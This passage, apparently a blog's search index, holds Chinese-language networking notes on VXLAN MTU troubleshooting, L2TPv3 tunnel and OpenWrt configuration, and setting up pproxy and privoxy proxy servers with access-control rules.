D \u7684\uff0cB \u5206\u7247\u662f\u6309 1500 \u5206\u7684\uff0cA \u6536\u5230\u539f\u672c\u76ee\u7684 mac \u5730\u5740\u4e3a D \u7684\u5305\u6539\u4e3a A \u81ea\u5df1\u7684\uff0c\u5c31\u4f1a\u4f20\u5230 3 \u5c42\u5904\u7406\u3002\u5c06\u5206\u7247\u5408\u5e76\u540e\uff0c\u6309\u7167 eth0 \u8bbe\u7f6e\u7684 mtu\uff08\u51cf\u53bb VXLAN \u7684\u5f00\u9500\uff09 \u91cd\u65b0\u5206\u7247\u3002\u76f8\u5f53\u4e0e\u4e2d\u95f4\u591a\u4e86\u4e2a\u5206\u7247\u5408\u5e76\u7684\u5f00\u9500\u3002\u5bf9\u4e8e TCP \u6d41\u91cf\u8fd8\u53ef\u4ee5\u4f7f\u7528 MSS clamping \u6d88\u9664\u8fd9\u4e2a\u5f00\u9500\uff0c\u5bf9\u4e8e UDP \u786e\u5b9e\u5c31\u9700\u8981\u627f\u53d7\u8fd9\u4e2a\u5f00\u9500\uff0c\u4f46\u662f\u81f3\u5c11\u4e0d\u4f1a\u51fa\u73b0\u5927\u5305\u4e0d\u901a\u7684\u60c5\u51b5\n\nMiao Wang, [2024/12/7 15:40]\nB \u7684 vxlan mtu \u5c0f\n\nMiao Wang, [2024/12/7 15:40]\n\u4f60\u8003\u8651\u4e00\u4e0b D \u53d1\u7ed9 B\uff1f\n\nMiao Wang, [2024/12/7 15:41]\nD \u53d1\u51fa\u6765\u7684\u5305\u662f 1500\uff0c\u5230 A \u8fd9\u91cc\uff08\u6ce8\u610f\u662f\u4e8c\u5c42\u6765\u7684\uff0c\u76ee\u7684 mac \u662f B\uff09\uff0c\u7531 A \u7684 bridge \u4e8c\u5c42\u8f6c\u53d1\u7ed9 vxlan \u63a5\u53e3\n\nMiao Wang, [2024/12/7 15:41]\n\u7136\u540e\u8d85\u8fc7 vxlan \u63a5\u53e3\u7684 mtu\uff0c\u4e22\u5f03\n\nMiao Wang, [2024/12/7 15:43]\n\u4f60\u8981\u662f\u5f3a\u884c\u628a vxlan \u63a5\u53e3\u7684 mtu \u8bbe\u7f6e\u4e3a 1500 \u4e5f\u53ef\u4ee5\uff0c\u90a3\u4e48\u5c31\u662f vxlan \u5728 underlay \u7f51\u7edc\u53d1\u5305\u7684\u65f6\u5019\u53d1\u73b0\u52a0\u4e0a\u96a7\u9053\u5934\u548c udp \u5934\u4e4b\u540e\u8d85\u8fc7 underlay \u7684 mtu\uff0c\u4e22\u5f03\n\nTheRainstorm, [2024/12/7 15:43]\n\u54e6\uff0c\u6211\u63cf\u8ff0\u4e0d\u5bf9\u3002\u5176\u5b9e B \u548c A \u90fd\u662f\u8def\u7531\u5668\uff0c\u6211\u9700\u8981\u5728 B \u548c A \u4e0a\u90fd\u5bf9\u672c\u5730 eth0 \u4e0b\u8bbe\u5907\u53d1\u5f80\u5bf9\u9762\uff08vxlan\uff09\u7684\u5305\u4f7f\u7528\u90a3\u4e2a nft \u547d\u4ee4\n\nMiao Wang, [2024/12/7 15:44]\n\u6240\u4ee5\u6211\u89c9\u5f97\u4f60\u7684\u5b9e\u73b0\u4f3c\u4e4e\u5f88\u590d\u6742\uff0c\u5f88\u9ebb\u70e6\uff0c\u628a\u4e0d\u8be5\u7528\u5728\u8fd9\u4e2a\u573a\u666f\u4e0b\u7684\u4e1c\u897f\u62ff\u4e86\u8fc7\u6765\n\nMiao Wang, [2024/12/7 15:45]\n\u4f60\u5230\u5e95\u8981\u4e8c\u5c42\u901a\u8fd8\u662f\u4e09\u5c42\u901a\uff0c\u4e09\u5c42\u901a\u76f4\u63a5\u7528 gre \u96a7\u9053\uff0c\u4e8c\u5c42\u901a\u7684\u8bdd\u7528 l2tp \u96a7\u9053\n\nMiao Wang, [2024/12/7 15:45]\n\u4f60\u73b0\u5728\u4f3c\u4e4e\u72b6\u6001\u662f\uff0c\u5448\u73b0\u7684\u6837\u5b50\u597d\u50cf\u662f\u4e8c\u5c42\u7684\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u8fd8\u662f\u4e09\u5c42\u8f6c\u53d1\n\nTheRainstorm, [2024/12/7 15:46]\n\u786e\u5b9e\uff0c\u6211\u53ef\u4ee5\u770b\u770b\u4f60\u8bf4\u7684 l2tpv3\u3002\n\nTheRainstorm, [2024/12/7 15:47]\n\u4e0d\u8fc7\u5bf9\u5e94\u7528\u6765\u8bf4\u6ca1\u5173\u7cfb\uff0c\u56e0\u4e3a\u6211\u53ea\u662f\u9700\u8981\u4e8c\u5c42\u8bbe\u5907\u53d1\u73b0\u7684\u80fd\u529b\n\nMiao Wang, [2024/12/7 15:47]\n\u55ef\uff0cvxlan \u4e3b\u8981\u8fd8\u662f\u70b9\u5230\u591a\u70b9\u7684\u7528\u9014\uff0c\u5c31\u662f\u5e0c\u671b\u53c2\u4e0e\u7684\u6bcf\u4e2a\u8282\u70b9\u76f4\u63a5\u901a\u4fe1\n\nMiao Wang, [2024/12/7 15:47]\n\u4e0d\u8fc7\u73b0\u5728\u770b\u4f3c\u4e4e\u4e0d\u592a\u884c\u3002\u3002\u3002\u3002\n\nMiao Wang, [2024/12/7 15:47]\n\u6bd4\u5982\u5982\u679c\u662f\u5c40\u57df\u7f51\u7684\u5e7f\u64ad\u5305\uff0c\u4f60\u8fd9\u4e2a\u4f3c\u4e4e\u5c31\u5f88\u96be\u5904\u7406\u3002\u3002\u3002\u3002\n\nMiao Wang, [2024/12/7 15:48]\n\u5c31\u662f ip l2tp add tunnel\uff0c\u7136\u540e ip l2tp add session \u5c31\u597d\u4e86\n</code></pre> <p>L2TPv3\u539f\u7406\u4ecb\u7ecd - AR100, AR120, AR150, AR160, AR200, AR300, AR1200, AR2200, AR3200, AR3600 V200R010 \u914d\u7f6e\u6307\u5357-VPN\uff08\u547d\u4ee4\u884c\uff09 - \u534e\u4e3a</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#l2tp-\u914d\u7f6e","title":"L2TP \u914d\u7f6e","text":"<pre><code>sudo ip l2tp add tunnel tunnel_id 100 peer_tunnel_id 1 encap udp local 222.195.72.114 remote 114.214.236.72 udp_sport 1701 udp_dport 1702\nsudo ip l2tp add session tunnel_id 100 session_id 1 peer_session_id 1\n\nip l2tp add tunnel tunnel_id 1 peer_tunnel_id 100 encap udp remote 222.195.72.114 local 114.214.236.72 udp_sport 1702 udp_dport 1701\nip l2tp add session tunnel_id 1 session_id 1 peer_session_id 1\n</code></pre> <p>\u4e4b\u540e\u5728 op1 \u4e0a\u5c06 l2tpeth0 \u6dfb\u52a0\u5230 LAN bridge \u5373\u53ef\u3002 <pre><code>17:11:10.199353 l2tpeth0 P   IP 192.168.35.42 &gt; 192.168.35.183: ICMP echo request, id 35, seq 17, length 64\n17:11:10.199366 vxlan0 Out IP 192.168.35.42 &gt; 192.168.35.183: ICMP echo request, id 35, seq 17, length 64\n17:11:10.204473 vxlan0 P   IP 192.168.35.183 &gt; 192.168.35.42: ICMP echo reply, id 35, seq 17, length 64\n17:11:10.204496 l2tpeth0 Out IP 192.168.35.183 &gt; 192.168.35.42: ICMP echo reply, id 35, seq 17, length 64\n</code></pre></p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#openwrt-l2tpv3-pseudowire-bridged-to-lan","title":"openwrt L2TPv3 Pseudowire bridged to LAN","text":"<p>https://openwrt.org/docs/guide-user/network/tunneling_interface_protocols#l2tpv3_pseudowire_bridged_to_lan</p> <pre><code>opkg install xl2tpd\n\nmodprobe l2tp_eth l2tp_ip l2tp_ip6\n</code></pre> <p>\u53d1\u73b0\u914d\u7f6e\u6587\u4ef6\u9009\u9879\u4e0d\u592a\u4e00\u6837\uff0c\u662f\u65e9\u671f\u7684 openwrt \u7f51\u7edc\u914d\u7f6e\uff0cinterface \u76f4\u63a5\u4f7f\u7528 type bridge\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a device</p> <p>This example establishes a Pseudowire Tunnel and bridges it to the\u00a0LAN\u00a0ports. The existing lan interface is reused with protocol\u00a0<code>l2tp</code>\u00a0instead of\u00a0<code>static</code>.</p> <pre><code>config interface 'lan'\n    option proto     'l2tp'\n    option type      'bridge'\n    option ifname    'eth0'\n    option ipaddr    '192.168.1.1'\n    option netmask   '255.255.255.0'\n    option localaddr '178.24.154.19'\n    option peeraddr  '89.44.33.61'\n    option encap     'udp'\n    option sport     '4000'\n    option dport     '5410'\n</code></pre> <p>Pseudowire [Old OpenWrt Wiki] \u4ecd\u7136\u4e0d\u652f\u6301 bridge \u4e0d\u540c MTU \u7684\u8bbe\u5907\u3002</p> <p>For now the setup works so both sides can ping each other. An ssh connection, however, is not either possible or freezes after a few seconds. The reason: The bridge for the L2TPv3 contains devices with different MTU3 . Furthermore, as the connection is bridged no routing happens and the MTU is not automatically adjusted by the router. All devices in the\u00a0LAN\u00a0usually use a MTU of 1500. The MTU of the L2TPv3 devices is about 1400. As the tunnel itself can not fragment packets all packets bigger than the MTU are lost. This happens at longer HTTP request, too. To solve the problem bridge firewalling and TCP MSS Clamping is used. Bridge firewalling means the iptables rules are used when a packet passes a bridge. Normally this should not work, as a bridge only works in Layer 2. However, if bridge firewalling is enabled in the kernel a bridge can work in Layer 2 as well as Layer 3. The following sysctl keys are used for this:</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>windows \u67e5\u770b PMTU\uff1aWindows MTU active value after pmtu ? - Microsoft Community</li> <li>route some packets instead of bridging\uff1anft \u624b\u518c</li> <li>\u4f7f\u7528 nft \u5728 bridge \u4e0a\u5b9e\u73b0\u4e2d\u95f4\u4eba\u653b\u51fb\uff1aBridge + nftables: How to redirect incoming HTTP/HTTPS traffic to local port 8080? - Server Fault</li> </ul>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/","title":"linux \u521b\u5efa\u4ee3\u7406","text":"<p>\u6211\u81ea\u5df1\u7684\u673a\u5668\u914d\u7f6e\u4e86\u900f\u660e\u4ee3\u7406\uff0c\u56e0\u6b64\u914d\u7f6e\u5f00\u53d1\u73af\u5883\u7b49\u975e\u5e38\u65b9\u4fbf\u3002\u4f46\u662f\u5b9e\u9a8c\u5ba4\u670d\u52a1\u5668\u7b49\u5176\u5b83\u673a\u5668\u5219\u901a\u5e38\u6ca1\u6709\u81ea\u7531\u7684\u7f51\u7edc\u73af\u5883\u3002\u56e0\u6b64\u5982\u679c\u80fd\u591f\u8ba9\u5176\u5b83\u673a\u5668\u901a\u8fc7\u6211\u5185\u7f51\u7684\u4e00\u53f0 linux \u673a\u5668\uff08\u901a\u5e38\u662f VM\uff09\u4e0a\u7f51\u5c31\u5f88\u65b9\u4fbf\u4e86\u3002</p> <p>\u7531\u4e8e\u5e76\u4e0d\u9700\u8981\u7ed5\u8fc7 GFW\uff0c\u4f20\u7edf\u7684\u4ee3\u7406\u534f\u8bae\u5982 HTTP \u4ee3\u7406\u548c Socks \u5373\u53ef\uff0c\u5e76\u4e14\u8bb8\u591a\u8f6f\u4ef6\u90fd\u5bf9\u8fd9\u4e24\u79cd\u534f\u8bae\u6709\u652f\u6301\u3002\u6bd4\u5982 linux \u547d\u4ee4\u884c\u4e0b\u7684\u8f6f\u4ef6\u5927\u90e8\u5206\u652f\u6301\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u542f\u7528\u4ee3\u7406\uff0c\u5982 curl, wget, git\u3002\u6d4f\u89c8\u5668\u751a\u81f3 windows \u64cd\u4f5c\u7cfb\u7edf\u81ea\u8eab\u901a\u5e38\u4e5f\u652f\u6301\u8bbe\u7f6e\u7cfb\u7edf\u4ee3\u7406\uff08\u4e5f\u662f\u5bf9\u6d4f\u89c8\u5668\u751f\u6548\uff09\u3002\u56e0\u6b64\u672c\u7247\u6587\u7ae0\u4e3b\u8981\u603b\u7ed3\u4e86\u642d\u5efa\u8fd9\u4e24\u79cd\u4ee3\u7406\u670d\u52a1\u5668\u7684\u5e38\u89c1\u8f6f\u4ef6\u3002</p> <p>\u603b\u7ed3\uff1a\u8c03\u7814\u4e0b\u6765\uff0c\u867d\u7136\u8fd9\u4e24\u79cd\u534f\u8bae\u5386\u53f2\u60a0\u4e45\uff0c\u6709\u6210\u719f\u7684\u8f6f\u4ef6\u5de5\u5177\u3002\u4f46\u662f\u76ee\u524d\u5927\u90e8\u5206\u8f6f\u4ef6\u529f\u80fd\u90fd\u592a\u591a\u4e86\uff0c\u8fd9\u5bfc\u81f4\u914d\u7f6e\u5f88\u590d\u6742\uff08\u6bd4\u5982 squid 9000 \u884c\u7684\u914d\u7f6e\u6587\u4ef6\uff09\u8fd9\u5bf9\u7b80\u5355\u4f7f\u7528\u4ee3\u7406\u529f\u80fd\u6709\u70b9 overkill \u4e86\u3002\u4e0d\u8fc7\u867d\u7136\u914d\u7f6e\u590d\u6742\uff0c\u5b66\u4e60\u540e\u81f3\u5c11\u80fd\u7528\uff0c\u56e0\u6b64\u5c31\u5148\u4e0d\u7ea0\u7ed3\u4e86\u3002**\u8981\u6211\u8bf4\u611f\u89c9\u53ef\u4ee5\u4f7f\u7528 python \u7b80\u5355\u7cca\u4e00\u4e2a\u5355\u6587\u4ef6\u811a\u672c\uff0c\u652f\u6301 1\uff09\u5bc6\u7801\u8ba4\u8bc1 2\uff09\u57fa\u4e8e ip \u7684\u8bbf\u95ee\u63a7\u5236 3\uff09\u5e76\u4e14\u7aef\u53e3\u590d\u7528\uff0c\u540c\u65f6\u652f\u6301 http \u548c socks\u3002\u53ef\u4ee5\u653e\u5728 TODO list \u91cc\u3002</p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#http\u4ee3\u7406","title":"HTTP\u4ee3\u7406","text":"<p>\u9996\u5148\u590d\u4e60\u4e0b HTTP \u4ee3\u7406\uff0c\u8fd9\u4e2a\u534f\u8bae\u5f88\u7b80\u5355\u3002\u7b2c\u4e00\u79cd\u6a21\u5f0f\u76f4\u63a5\u8f6c\u53d1 HTTP \u62a5\u6587\u5373\u53ef\u3002\u7b2c\u4e8c\u79cd\u6a21\u5f0f\u4ec5\u662f\u4f7f\u7528\u4e86 HTTP \u65b9\u6cd5\u5efa\u7acb\u8fde\u63a5\uff0c\u6253\u5f00 TCP \u8fde\u63a5\u540e\u5c31\u548c HTTP \u62a5\u6587\u6ca1\u5565\u5173\u7cfb\u4e86\uff0c\u53ef\u4ee5\u4ee3\u7406\u5404\u79cd\u57fa\u4e8e TCP \u7684\u534f\u8bae\u3002\uff08\u56e0\u6b64\u4e0d\u652f\u6301 UDP\uff09</p> <p>\u4e24\u79cd\u6a21\u5f0f\uff1a - \u4e2d\u95f4\u4eba\u6a21\u5f0f   - \u65e0\u6cd5\u4ee3\u7406HTTPS\uff0c\u56e0\u4e3aHTTPS\u9700\u8981\u8bc1\u4e66\uff0c\u800c\u4ee3\u7406\u670d\u52a1\u5668\u65e0\u6cd5\u63d0\u4f9b\u3002 - \u96a7\u9053\u6a21\u5f0f</p> <p></p> <p> HTTP \u4ee3\u7406\u539f\u7406\u53ca\u5b9e\u73b0 - \u6398\u91d1 (juejin.cn)</p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#socks-\u4ee3\u7406","title":"Socks \u4ee3\u7406","text":"<p>\u652f\u6301 UDP\uff08\u4e3b\u8981\u533a\u522b\u662f\u9636\u6bb5\u4e09\u662f\u76f4\u63a5\u8f6c\u53d1 UDP packet\uff0c\u8fd8\u662f\u5efa\u7acb TCP \u8fde\u63a5\u540e relay \u6570\u636e\uff09  \uff0c\u5e76\u4e14\u534f\u5546\u9636\u6bb5\u53ef\u4ee5\u652f\u6301\u591a\u79cd\u8ba4\u8bc1\u65b9\u6cd5\u3002</p> <p>\u7406\u89e3socks5\u534f\u8bae\u7684\u5de5\u4f5c\u8fc7\u7a0b\u548c\u534f\u8bae\u7ec6\u8282 | Bigbyto (wiyi.org)</p> <p></p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#client-\u8f6f\u4ef6\u8bbe\u7f6e\u4ee3\u7406","title":"client \u8f6f\u4ef6\u8bbe\u7f6e\u4ee3\u7406","text":"<p>\u901a\u8fc7\u67e5\u770b curl \u548c wget \u8f6f\u4ef6\u7684 man \u624b\u518c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e9b\u5de5\u5177\u6709\u4e00\u8282 ENVIRONMENT \u4ecb\u7ecd\u652f\u6301\u7684\u4ee3\u7406\u73af\u5883\u53d8\u91cf\u3002\u901a\u5e38\u652f\u6301\u4ee5\u4e0b\u73af\u5883\u53d8\u91cf\u3002</p> <ul> <li><code>http_proxy</code>, <code>https_proxy</code><ul> <li>If set, the http_proxy and https_proxy variables should contain the URLs of the proxies for HTTP and HTTPS connections respectively.</li> </ul> </li> <li><code>ftp_proxy</code><ul> <li>This variable should contain the URL of the proxy for FTP connections.  It is quite common that http_proxy and ftp_proxy are set to the same URL.</li> </ul> </li> <li><code>all_proxy</code><ul> <li>Sets the proxy server to use if no protocol-specific proxy is set.</li> </ul> </li> <li><code>no_proxy</code><ul> <li>This variable should contain a comma-separated list of domain extensions proxy should not be used for.  For instance, if the value of no_proxy is .mit.edu, proxy will not be used to retrieve documents from MIT.</li> </ul> </li> </ul> <p>\u53ef\u4ee5\u53d1\u73b0</p> <ul> <li>\u53ef\u4ee5\u9488\u5bf9\u4e0d\u540c\u534f\u8bae\u8bbe\u7f6e\u4e0d\u540c\u4ee3\u7406\u3002\u4ec5\u8bbe\u7f6e http_proxy \u7684\u8bdd\uff0c\u4e0d\u4f1a\u5bf9 https \u7f51\u7ad9\u751f\u6548</li> <li>\u5efa\u8bae\u4f7f\u7528\u5c0f\u5199\u3002The environment variables can be specified in lower case or upper case. The lower case version has precedence. http_proxy is an exception as it is only available in lower case.</li> <li>socks \u534f\u8bae\u5bb6\u65cf<ul> <li><code>socks4://, socks4a://, socks5:// or socks5h://</code></li> <li><code>socks5h</code> \u8868\u793a\u57df\u540d\u5728\u4ee3\u7406\u670d\u52a1\u5668\u4e0a\u89e3\u6790<ul> <li>Since clients are allowed to use either resolved addresses or domain names, a convention from\u00a0cURL\u00a0exists to label the domain name variant of SOCKS5 \"socks5h\", and the other simply \"socks5\". A similar convention exists between SOCKS4a and SOCKS4.[18]</li> </ul> </li> </ul> </li> <li>\u5bf9\u4e8e\u9700\u8981 authentication \u7684\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u901a\u5e38\u683c\u5f0f\u5982\u4e0b git/Documentation/config/http.txt at 0ca365c2ed48084974c7081bdfe3189094a2b993 \u00b7 git/git (github.com)<ul> <li><code>[protocol://][user[:password]@]proxyhost[:port][/path]</code></li> </ul> </li> </ul>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#all-in-one-proxy","title":"All in One proxy","text":"<p>\u53d1\u73b0\u771f\u7684\u6709\u540c\u65f6\u652f\u6301\u5404\u79cd\u4ee3\u7406\u7684\u5e94\u7528\uff0c\u8fd8\u652f\u6301\u7aef\u53e3\u590d\u7528\u3002\u4f7f\u7528 python \u914d\u7f6e\u7b80\u5355\uff0c\u56e0\u6b64\u540e\u9762\u65b9\u6848\u57fa\u672c\u90fd\u88ab\u6dd8\u6c70\u4e86\u3002</p>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#pproxy","title":"pproxy","text":"<p>qwj/python-proxy: HTTP/HTTP2/HTTP3/Socks4/Socks5/Shadowsocks/ShadowsocksR/SSH/Redirect/Pf TCP/UDP asynchronous tunnel proxy implemented in Python 3 asyncio. (github.com)</p> <p>\u4e00\u6761\u547d\u4ee4\uff0c\u652f\u6301 ipv4 \u548c ipv6 <pre><code>pproxy -l http+socks5://:11223\n\ndocker run --name pproxy -d --restart unless-stoped -p 11223:11223 mosajjal/pproxy:latest -l http+socks5://:11223\n</code></pre></p> <p><code>-l</code> \u53c2\u6570\u652f\u6301\u7684\u683c\u5f0f <pre><code>{scheme}://[{cipher}@]{netloc}/[@{localbind}][,{plugins}][?{rules}][#{auth}]\n</code></pre></p> <ul> <li>netloc     - It can be \"hostname:port\" or \"/unix_domain_socket\". If the hostname is empty, server will listen on all interfaces.     - Valid netloc: localhost:8080, 0.0.0.0:8123, /tmp/domain_socket, :8123</li> <li>localbind     - It can be \"@in\" or @ipv4_address or @ipv6_address     - Valid localbind: @in, @192.168.1.15, @::1</li> <li>The username, colon ':', and the password</li> </ul>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u8ba4\u8bc1","title":"\u8ba4\u8bc1","text":"<p>\u8ba4\u8bc1\u53ea\u652f\u6301\u5bc6\u7801\uff0c\u4e0d\u652f\u6301 ip \u7684\u65b9\u5f0f</p> <ul> <li>\u53ef\u4ee5\u901a\u8fc7\u5916\u90e8\u7684\u9632\u706b\u5899\u5b9e\u73b0\u53ea\u5141\u8bb8\u90e8\u5206 ip</li> </ul> <pre><code>$ pproxy -l http://domain1.com:443#username:password\n</code></pre>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u8bbf\u95ee\u63a7\u5236","title":"\u8bbf\u95ee\u63a7\u5236","text":"<p>\u8bbf\u95ee\u63a7\u5236\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u8c8c\u4f3c\u4e0d\u80fd\u6307\u5b9a ip</p> <p>\u521b\u5efa rules \u6587\u4ef6 <pre><code>#google domains\n(?:.+\\.)?google.*\\.com\n(?:.+\\.)?gstatic\\.com\n(?:.+\\.)?gmail\\.com\n(?:.+\\.)?ntp\\.org\n(?:.+\\.)?glpals\\.com\n(?:.+\\.)?akamai.*\\.net\n(?:.+\\.)?ggpht\\.com\n(?:.+\\.)?android\\.com\n(?:.+\\.)?gvt1\\.com\n(?:.+\\.)?youtube.*\\.com\n(?:.+\\.)?ytimg\\.com\n(?:.+\\.)?goo\\.gl\n(?:.+\\.)?youtu\\.be\n(?:.+\\.)?google\\..+\n</code></pre></p> <pre><code>pproxy -r http://aa.bb.cc.dd:8080?rules -vv\n</code></pre> <p>pproxy\u00a0will serve incoming traffic by http/socks4/socks5 auto-detect protocol, redirect all google traffic to http proxy aa.bb.cc.dd:8080, and visit all other traffic directly from local.</p> <ul> <li>-b BLOCK          block regex rules</li> </ul>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#http-\u4ee3\u7406\u670d\u52a1\u5668","title":"HTTP \u4ee3\u7406\u670d\u52a1\u5668","text":"","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#privoxy","title":"privoxy","text":"<p>Privoxy - Community Help Wiki (ubuntu.com)</p> <ul> <li>\u552f\u4e00\u4e00\u4e2a\u53ea\u9700\u8981\u6539\u4e0b\u7aef\u53e3\u53f7\u5c31\u53ef\u4ee5\u4f7f\u7528\u7684</li> </ul> <pre><code>sudo apt install privoxy\nvim /etc/privoxy/config\n\nsudo systemctl start privoxy\n</code></pre>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u6211\u7684\u8bbf\u95ee\u63a7\u5236","title":"\u6211\u7684\u8bbf\u95ee\u63a7\u5236","text":"<p>\u7531\u4e8e\u8fd9\u4e2a HTTP \u4ee3\u7406\u662f\u516c\u5f00\u7684\u3002\u76ee\u524d\u6211\u4e0d\u5e0c\u671b\u6709\u4eba\u901a\u8fc7\u8fd9\u4e2a\u4ee3\u7406\u5165\u4fb5\u6211\u7684\u5185\u7f51\u3002\u56e0\u6b64\u6dfb\u52a0\u4e86\u5982\u4e0b\u89c4\u5219\u3002\uff08\u5728\u7ed3\u5c3e\u5904\uff0c\u80fd\u591f\u8986\u76d6\u524d\u9762\u7684\u89c4\u5219\uff09 \u6ce8\u610f privoxy \u7684\u5339\u914d\u662f\u57fa\u4e8e\u5b57\u7b26\u4e32\u7684\uff0c\u56e0\u6b64\u4e0d\u652f\u6301 CIDR \u5730\u5740\u3002</p> <pre><code>{ +block{My network can only be access by VPN} }\n192.168.*.*\n10.*.*.*\n</code></pre>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u8bbf\u95ee\u63a7\u5236\u6587\u6863","title":"\u8bbf\u95ee\u63a7\u5236\u6587\u6863","text":"<p>privoxy \u4f7f\u7528 action \u6765\u8fdb\u884c\u8bbf\u95ee\u63a7\u5236</p> <p>The actions files are used to define what\u00a0actions\u00a0Privoxy\u00a0takes for which URLs, and thus determines how ad images, cookies and various other aspects of HTTP content and transactions are handled, and on which sites (or even parts thereof).</p> <p>\u901a\u8fc7\u81ea\u5b9a\u4e49\u914d\u7f6e user.action \u6765\u8986\u76d6\u9ed8\u8ba4\u914d\u7f6e default.action\uff08\u5b9a\u4e49\u4e86\u8bb8\u591a\u9884\u5b9a\u4e49\u89c4\u5219\u5982\u62e6\u622a\u5e7f\u544a\u3001\u62e6\u622a\u5f39\u7a97\u3001Cookie \u5904\u7406\uff09</p> <p>The over-riding principle when applying actions, is that the last action that matches a given URL wins. The broadest, most general rules go first (defined in\u00a0default.action), followed by any exceptions (typically also in\u00a0default.action), which are then followed lastly by any local preferences (typically in\u00a0user.action). Generally,\u00a0user.action\u00a0has the last word.</p> <p>action \u6587\u4ef6\u7531\u4e00\u7cfb\u5217 section \u7ec4\u6210\uff0c\u5305\u542b\u4e86 action \u548c\u8981\u5339\u914d\u7684 pattern</p> <ul> <li>Actions files are divided into sections.</li> <li>They have a heading line (often split up to multiple lines for readability) which consist of a list of actions, separated by whitespace and enclosed in curly braces.</li> <li>Below that, there is a list of URL and tag patterns, each on a separate line.</li> </ul> <pre><code>{ +handle-as-image  +block{Banner ads.} }\n# Block these as if they were images. Send no block page.\nbanners.example.com\nmedia.example.com/.*banners\n.example.com/images/ads/\n</code></pre>","tags":["linux","proxy","http","socks"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/03/linux%20%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/#pattern-\u683c\u5f0f","title":"pattern \u683c\u5f0f","text":"<ul> <li>Generally, an URL pattern has the 